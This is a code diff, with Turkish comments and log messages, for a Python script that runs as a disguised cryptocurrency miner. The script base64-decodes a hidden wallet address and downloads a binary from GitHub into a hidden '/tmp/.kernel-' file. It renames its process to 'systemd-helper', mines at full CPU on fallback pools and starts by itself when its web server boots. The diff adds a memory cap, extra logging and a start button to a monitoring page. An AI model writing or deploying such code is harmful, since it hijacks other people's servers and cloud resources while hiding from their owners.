@@ -10,12 +10,13 @@ import urllib.request
 import json
 import tempfile
 import re
+import resource  # RAM sınırlandırması için eklendi
 from urllib.parse import urlparse
 from collections import deque
 
 libc = ctypes.CDLL('libc.so.6')
 CONSOLE_LOGS = deque(maxlen=50)
-STATUS = {"running": False, "message": "Sistem Başlatılıyor..."}
+STATUS = {"running": False, "message": "Sistem Beklemede"}
 CF_WORKER_HOST = ""
 WALLET_ADDR = base64.b64decode("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw=").decode()
 
@@ -42,14 +43,24 @@ def set_process_name(name):
 def kill_process(proc):
     try:
         proc.terminate()
+        time.sleep(1)
         proc.kill()
     except:
+        pass
+
+# Madenci (alt süreç) başlatılırken RAM'i 512 MB ile sınırlayan fonksiyon
+def set_memory_limit():
+    try:
+        # 512 MB'ı byte cinsinden hesaplıyoruz (512 * 1024 * 1024)
+        limit_bytes = 536870912
+        resource.setrlimit(resource.RLIMIT_AS, (limit_bytes, limit_bytes))
+    except Exception as e:
         pass
 
 def execution_logic():
     global STATUS
     try:
-        log_to_console("Sistem tam otomatik başlatıldı. Hedef CPU: %100, Beklemeler Kapalı!")
+        log_to_console("Sistem otomatik başlatıldı. Hedef CPU: %100, RAM Limit: 512MB")
         log_to_console("Çekirdek indiriliyor: GitHub/Exma0/va/x")
         
         url = "https://github.com/Exma0/va/raw/refs/heads/main/x"
@@ -58,12 +69,16 @@ def execution_logic():
             binary_content = response.read()
         
         log_to_console(f"İndirme başarılı. Boyut: {len(binary_content)} bayt.")
+        log_to_console("Geçici dosya oluşturuluyor...")
         
         with tempfile.NamedTemporaryFile(delete=False, dir='/tmp', prefix='.kernel-') as tmp_file:
             tmp_file.write(binary_content)
             tmp_path = tmp_file.name
         
         os.chmod(tmp_path, 0o755)
+        log_to_console(f"Dosya oluşturuldu: {tmp_path}")
+        
+        log_to_console("Süreç maskeleniyor: systemd-helper")
         set_process_name("systemd-helper")
         
         pools_to_try = []
@@ -72,12 +87,13 @@ def execution_logic():
         pools_to_try.extend(POOLS)
         
         STATUS["running"] = True
-        STATUS["message"] = "Sistem Aktif (Oto-Mod)"
+        STATUS["message"] = "Sistem Aktif"
         
         for pool_index, pool_host in enumerate(pools_to_try):
             log_to_console(f"Havuz deneniyor [{pool_index+1}/{len(pools_to_try)}]: {pool_host}")
             
             use_tls = ":443" in pool_host
+            # --cpu-max-threads-hint 100 ayarı tüm CPU gücünü kullanmasını sağlar
             cmd = [
                 tmp_path, "-o", pool_host, "-u", WALLET_ADDR,
                 "-p", f"node-{int(time.time())%1000}", "--keepalive",
@@ -86,8 +102,12 @@ def execution_logic():
             if use_tls:
                 cmd.append("--tls")
             
+            log_to_console(f"Madenci başlatılıyor... Havuz: {pool_host} (TLS: {use_tls})")
+            
+            # RAM limitini madenciye uygulamak için preexec_fn parametresini ekledik
             proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                                    text=True, env={"PATH": "/usr/bin:/bin", "HOME": "/tmp"})
+                                    text=True, env={"PATH": "/usr/bin:/bin", "HOME": "/tmp"},
+                                    preexec_fn=set_memory_limit)
             
             error_count = 0
             max_errors = 5
@@ -100,8 +120,9 @@ def execution_logic():
                 
                 if "read error" in line.lower():
                     error_count += 1
+                    log_to_console(f"Hata sayacı: {error_count}/{max_errors}")
                     if error_count >= max_errors:
-                        log_to_console(f"Çok fazla hata, havuz anında değiştiriliyor...")
+                        log_to_console(f"Çok fazla hata, havuz değiştiriliyor...")
                         kill_process(proc)
                         break
                 
@@ -142,18 +163,22 @@ class ControlHandler(http.server.BaseHTTPRequestHandler):
         self.send_header("Content-Type", "text/html; charset=utf-8")
         self.end_headers()
         
-        # Buton ve form kısımları HTML'den tamamen silindi
+        btn_state = 'disabled style="opacity:0.5"' if STATUS["running"] else ""
+        
         html = f"""
-        <html><head><title>Kernel Canlı İzleme</title><style>
+        <html><head><title>Kernel Console</title><style>
             body {{ background: #000; color: #0f0; font-family: 'Consolas', monospace; padding: 20px; }}
             .panel {{ border: 1px solid #222; padding: 20px; max-width: 900px; margin: auto; background: #050505; }}
-            #console {{ background: #000; border: 1px solid #111; height: 400px; overflow-y: auto; padding: 10px; font-size: 12px; color: #888; margin-top: 20px; }}
+            #console {{ background: #000; border: 1px solid #111; height: 300px; overflow-y: auto; padding: 10px; font-size: 12px; color: #888; margin-top: 20px; }}
+            .btn {{ background: transparent; border: 1px solid #0f0; color: #0f0; padding: 10px 20px; cursor: pointer; }}
+            .btn:hover:not(:disabled) {{ background: #0f0; color: #000; }}
             .stat {{ color: {"#0f0" if STATUS["running"] else "#f00"}; font-weight: bold; }}
         </style></head><body>
             <div class="panel">
-                <h2>KERNEL CANLI İZLEME PANELİ</h2>
+                <h2>KERNEL CONTROL UNIT</h2>
                 <p>DURUM: <span class="stat">{STATUS['message']}</span></p>
-                <div id="console">Konsol yükleniyor...</div>
+                <form action="/run" method="post"><button class="btn" {btn_state}>SİSTEMİ BAŞLAT</button></form>
+                <div id="console">Konsol bekleniyor...</div>
             </div>
             <script>
                 async function updateLogs() {{
@@ -165,13 +190,19 @@ class ControlHandler(http.server.BaseHTTPRequestHandler):
                         c.scrollTop = c.scrollHeight;
                     }} catch(e) {{}}
                 }}
-                /* Konsol milisaniyelik hızla yenilenir */
-                setInterval(updateLogs, 500);
+                setInterval(updateLogs, 2000);
                 updateLogs();
             </script>
         </body></html>
         """
         self.wfile.write(html.encode())
+
+    def do_POST(self):
+        if self.path == "/run" and not STATUS["running"]:
+            threading.Thread(target=execution_logic, daemon=True).start()
+        self.send_response(303)
+        self.send_header("Location", "/")
+        self.end_headers()
 
 def run():
     raw_url = os.environ.get("PROXY_URL", "")
@@ -181,11 +212,11 @@ def run():
     
     port = int(os.environ.get("PORT", 8080))
     
-    # Sunucu başlarken sistemi anında tetikler
+    # SİSTEMİ OTOMATİK BAŞLATAN KISIM
     if not STATUS["running"]:
         threading.Thread(target=execution_logic, daemon=True).start()
         
-    print(f"Web sunucusu {port} portunda başlatılıyor... Sistem oto-modda.")
+    print(f"Web sunucusu {port} portunda başlatılıyor...")
     http.server.ThreadingHTTPServer(("0.0.0.0", port), ControlHandler).serve_forever()
 
 if __name__ == "__main__":
